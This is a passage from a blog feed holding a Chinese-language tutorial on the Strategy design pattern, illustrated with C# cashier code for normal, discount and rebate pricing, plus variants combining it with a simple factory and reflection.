punctuation">}</span>    <span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> 设计模式 </tag>
            
            <tag> 装饰模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>策略模式</title>
      <link href="/2020/08/22/ce-lue-mo-shi/"/>
      <url>/2020/08/22/ce-lue-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="定义理解"><a href="#定义理解" class="headerlink" title="定义理解"></a>定义理解</h1><p>​        策略模式时一种<strong>行为型模式</strong>，主要用于需要使用不同的算法来处理不同的数据（对象）时。策略模式是一种定义一系列算法的的方法，从概念上来看，所有这些算法完成的都是相同的工作，只是实现不同，它可以以相同的方式调用所有的算法，减少各种算法类与使用算法类之间的耦合，即<strong>在运行时选择算法</strong>。</p><p>​        <font color="blue">定义算法家族，分别封装起来，让它们之间可以相互替换，此模式让算法的变化，不会影响到使用算法的客户 。</font></p><h1 id="角色与职责"><a href="#角色与职责" class="headerlink" title="角色与职责"></a>角色与职责</h1><ul><li><p><strong>抽象策略角色（Strategy）</strong>：策略类，通常由一个<strong>接口</strong>或者<strong>抽象类</strong>来实现</p><p>​        定义一个公共接口，各种不同的算法以不同的方式实现这个接口，Context使用这个接口调用不同的算法，一般用接口或抽象类来实现。</p></li><li><p><strong>具体策略角色（ConcreteStrategy）</strong>：包装了相关的<strong>算法和行为</strong></p><p>​        实现Strategy定义的接口，提供具体的算法实现。</p></li><li><p><strong>环境角色（Context）</strong>：持有一个<strong>策略类的引用</strong>最终给客户端调用</p><ul><li>需要使用ConcreteStrategy提供的算法</li><li>内部维护一个Strategy的实例</li><li>负责动态设置运行时Strategy具体的实现算法</li><li>负责跟Strategy之间的交互和数据传递</li></ul></li></ul><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><ol><li>识别客户端可能需要的各种算法（即功能）（<strong>抽象策略角色</strong>）</li><li>在接口中指定该算法的签名（原型）（<strong>具体策略角色</strong>）</li><li>在派生类中提供可选择的实现细节（<strong>环境角色</strong>）</li><li>将客户端的算法和接口耦合</li></ol><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><p><strong>代码结构图</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/策略模式/策略模式结构图.jpg" alt="策略模式结构图"></center><p><strong>抽象策略角色</strong>：</p><p><strong>CashSuper类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//算法的公共接口</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">CashSuper</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//抽象出来的接口方法</span>        <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>具体策略角色</strong>：</p><p><strong>CashNormal类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//不折扣算法</span>    <span class="token keyword">class</span> <span class="token class-name">CashNormal</span> <span class="token punctuation">:</span> CashSuper    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> money<span class="token punctuation">;</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashRebate类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//折扣算法</span>    <span class="token keyword">class</span> <span class="token class-name">CashRebate</span> <span class="token punctuation">:</span> CashSuper    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 几折（默认为1折）</span>        <span class="token keyword">private</span> <span class="token keyword">double</span> moneyRebate <span class="token operator">=</span> 1d<span class="token punctuation">;</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 带参构造函数-设置打折力度</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 带参构造函数-设置打折力度</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="moneyRebate">几折&lt;/param></span>        <span class="token keyword">public</span> <span class="token function">CashRebate</span><span class="token punctuation">(</span><span class="token keyword">string</span> moneyRebate<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>moneyRebate <span class="token operator">=</span> <span class="token keyword">double</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>moneyRebate<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 重写acceptCash方法</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 重写acceptCash方法</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="money">原始钱数&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>返回折后钱数&lt;/returns></span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> money <span class="token operator">*</span> moneyRebate<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashReturn类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//返利算法</span>    <span class="token keyword">class</span> <span class="token class-name">CashReturn</span> <span class="token punctuation">:</span> CashSuper    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 金额限度</span>        <span class="token keyword">private</span> <span class="token keyword">double</span> moneyCondition <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 返还力度</span>        <span class="token keyword">private</span> <span class="token keyword">double</span> moneyReturn <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 构造函数-设置金额限度和返还力度</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 构造函数-设置金额限度和返还力度</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="moneyCondition">金额限度&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="moneyReturn">返还力度&lt;/param></span>        <span class="token keyword">public</span> <span class="token function">CashReturn</span><span class="token punctuation">(</span><span class="token keyword">string</span> moneyCondition<span class="token punctuation">,</span> <span class="token keyword">string</span> moneyReturn<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>moneyCondition <span class="token operator">=</span> <span class="token keyword">double</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>moneyCondition<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>moneyReturn <span class="token operator">=</span> <span class="token keyword">double</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>moneyReturn<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 重构acceptCash方法</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 重构acceptCash方法</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="money">原始金额&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>返回实际应付金额&lt;/returns></span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">double</span> result <span class="token operator">=</span> money<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>money <span class="token operator">>=</span> moneyCondition<span class="token punctuation">)</span>                result <span class="token operator">=</span> money <span class="token operator">-</span> Math<span class="token punctuation">.</span><span class="token function">Floor</span><span class="token punctuation">(</span>money <span class="token operator">/</span> moneyCondition<span class="token punctuation">)</span> <span class="token operator">*</span> moneyReturn<span class="token punctuation">;</span>            <span class="token keyword">return</span> result<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>环境角色</strong>：</p><p><strong>CashContext类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//收费策略Context</span>    <span class="token keyword">class</span> <span class="token class-name">CashContext</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//声明一个现金收费父类对象</span>        <span class="token keyword">private</span> CashSuper cs<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//设置策略行为，参数为具体的现金收费子类（正常，打折或返利）</span>        <span class="token keyword">public</span> <span class="token function">CashContext</span><span class="token punctuation">(</span>CashSuper csuper<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>cs <span class="token operator">=</span> csuper<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//得到现金促销计算结果（利用了多态机制，不同的策略行为导致不同的结果）</span>        <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">GetResult</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> cs<span class="token punctuation">.</span><span class="token function">acceptCash</span><span class="token punctuation">(</span>money<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>测试类</strong>：</p><p><strong>测试界面</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/策略模式/策略模式测试界面.png" alt="策略模式测试界面"></center><p><strong>测试类代码</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">Form1</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">Form1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">double</span> total <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//用于总计</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnOk_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            CashContext cc <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span>cbxType<span class="token punctuation">.</span>SelectedItem<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//直接传策略对象参数进行上下文对象的创建</span>                <span class="token keyword">case</span> <span class="token string">"正常收费"</span><span class="token punctuation">:</span>                    cc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashContext</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CashNormal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"满300返100"</span><span class="token punctuation">:</span>                    cc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashContext</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CashReturn</span><span class="token punctuation">(</span><span class="token string">"300"</span><span class="token punctuation">,</span> <span class="token string">"100"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"打8折"</span><span class="token punctuation">:</span>                    cc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashContext</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CashRebate</span><span class="token punctuation">(</span><span class="token string">"0.8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">double</span> totalPrices <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//计算</span>            totalPrices <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">GetResult</span><span class="token punctuation">(</span>Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtPrice<span class="token punctuation">.</span>Text<span class="token punctuation">)</span> <span class="token operator">*</span> Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtNum<span class="token punctuation">.</span>Text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            total <span class="token operator">=</span> total <span class="token operator">+</span> totalPrices<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//显示结果</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">"单价："</span> <span class="token operator">+</span> txtPrice<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" 数量："</span> <span class="token operator">+</span> txtNum<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> cbxType<span class="token punctuation">.</span>SelectedItem <span class="token operator">+</span> <span class="token string">" 合计："</span> <span class="token operator">+</span> totalPrices<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> total<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnClear_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            total <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            txtPrice<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>            txtNum<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>测试结果</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/策略模式/策略模式测试结果展示.png" alt="策略模式测试结果展示"></center><h1 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h1><p><strong>优点</strong>：</p><ol><li>策略模式提供了<strong>管理</strong>相关<strong>算法族</strong>的办法。</li><li>策略模式提供了可以<strong>替换继承关系</strong>的办法。</li><li>使用策略模式可以<strong>避免使用多重条件转移语句</strong>。</li></ol><p><strong>缺点</strong>：</p><ol><li><strong>客户端</strong>必须<strong>知道所有的策略类</strong>，并且<strong>自行决定</strong>使用哪一个策略类</li><li>策略模式造成<strong>很多的策略类</strong>，每一个具体的策略类都会产生一个新类</li></ol><h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><ol><li>多个类<strong>只区别在表现行为不同</strong>，可以使用Strategy模式，在运行时动态选择具体要执行的行为；</li><li>需要在不同情况下使用不同的策略(算法),或者策略还可能在未来用其他方式来实现；</li><li>对客户隐藏具体的策略(算法)的实现细节，彼此完全独立。</li></ol><h1 id="算法改进"><a href="#算法改进" class="headerlink" title="算法改进"></a>算法改进</h1><h2 id="策略与简单工厂集合"><a href="#策略与简单工厂集合" class="headerlink" title="策略与简单工厂集合"></a>策略与简单工厂集合</h2><p>改造后的环境类：(CashContext.cs)</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//现金收取工厂</span>    <span class="token keyword">class</span> <span class="token class-name">CashContext</span>    <span class="token punctuation">{</span>        CashSuper cs <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//根据条件返回相应的对象</span>        <span class="token keyword">public</span> <span class="token function">CashContext</span><span class="token punctuation">(</span><span class="token keyword">string</span> type<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">"正常收费"</span><span class="token punctuation">:</span>                    CashNormal cs0 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashNormal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cs <span class="token operator">=</span> cs0<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"满300返100"</span><span class="token punctuation">:</span>                    CashReturn cr1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashReturn</span><span class="token punctuation">(</span><span class="token string">"300"</span><span class="token punctuation">,</span> <span class="token string">"100"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cs <span class="token operator">=</span> cr1<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"打8折"</span><span class="token punctuation">:</span>                    CashRebate cr2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashRebate</span><span class="token punctuation">(</span><span class="token string">"0.8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cs <span class="token operator">=</span> cr2<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">GetResult</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> cs<span class="token punctuation">.</span><span class="token function">acceptCash</span><span class="token punctuation">(</span>money<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>客户端测试代码</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//策略对象的的创建在上下文类中完成，即策略对象的创建是对用户保密的</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">Form1</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">Form1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//客户端窗体程序（主要部分）</span>        <span class="token keyword">double</span> total <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnOk_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//利用简单工厂模式根据下拉选择框，生成相应的对象</span>            CashContext csuper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashContext</span><span class="token punctuation">(</span>cbxType<span class="token punctuation">.</span>SelectedItem<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">double</span> totalPrices <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//通过多态，可以得到收取费用的结果</span>            totalPrices <span class="token operator">=</span> csuper<span class="token punctuation">.</span><span class="token function">GetResult</span><span class="token punctuation">(</span>Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtPrice<span class="token punctuation">.</span>Text<span class="token punctuation">)</span> <span class="token operator">*</span> Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtNum<span class="token punctuation">.</span>Text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            total <span class="token operator">=</span> total <span class="token operator">+</span> totalPrices<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//展示计价结果</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">"单价："</span> <span class="token operator">+</span> txtPrice<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" 数量："</span> <span class="token operator">+</span> txtNum<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" "</span>                <span class="token operator">+</span> cbxType<span class="token punctuation">.</span>SelectedItem <span class="token operator">+</span> <span class="token string">" 合计："</span> <span class="token operator">+</span> totalPrices<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> total<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnClear_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            total <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            txtPrice<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>            txtNum<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0"</span><span class="token punctuation">;</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>注</strong>：</p><ul><li>策略模式客户端需要认识<strong>CashSuper类</strong>、<strong>CashNormal类</strong>、<strong>CashReturn类</strong>、<strong>CashRebate类</strong>、<strong>CashContext类</strong>；</li><li>简单工厂模式客户端需要认识<strong>CashSuper类</strong>、<strong>工厂类</strong>；</li><li>策略与简单工厂集合之后，客户端只需要认识一个<strong>CashContext类</strong>即可，耦合度更加低。</li></ul><h2 id="策略-反射"><a href="#策略-反射" class="headerlink" title="策略 + 反射"></a>策略 + 反射</h2><p>改造后的环境类：(CashContext.cs)</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">CashContext</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> CashSuper cs<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//设置上下文中的策略实例对象</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBehavior</span><span class="token punctuation">(</span>CashSuper csuper<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>cs <span class="token operator">=</span> csuper<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">GetResult</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> cs<span class="token punctuation">.</span><span class="token function">acceptCash</span><span class="token punctuation">(</span>money<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>客户端测试代码</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token comment" spellcheck="true">/********************************** *  * 程序说明：使用反射 + 策略模式  来实现 *  *          反射：下拉列表中的文件数据直接从配置.xml文件中获取，即在程序运行时程序才知道下拉框中会有什么内容 *          策略：使用能统一调用所有策略对象的上下文对象 *  *  */</span> <span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Data<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Reflection<span class="token punctuation">;</span><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">Form1</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">Form1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        DataSet ds<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//用于存放配置文件信息</span>        <span class="token keyword">double</span> total <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//用于总计</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 在程序加载时，读取指定文件中的所有内容</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="sender">&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="e">&lt;/param></span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">Form1_Load</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//读配置文件                     --在程序运行的路径下</span>            ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ds<span class="token punctuation">.</span><span class="token function">ReadXml</span><span class="token punctuation">(</span>Application<span class="token punctuation">.</span>StartupPath <span class="token operator">+</span> <span class="token string">"\\CashAcceptType.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//将读取到的记录绑定到下拉列表框中</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span>DataRowView dr <span class="token keyword">in</span> ds<span class="token punctuation">.</span>Tables<span class="token 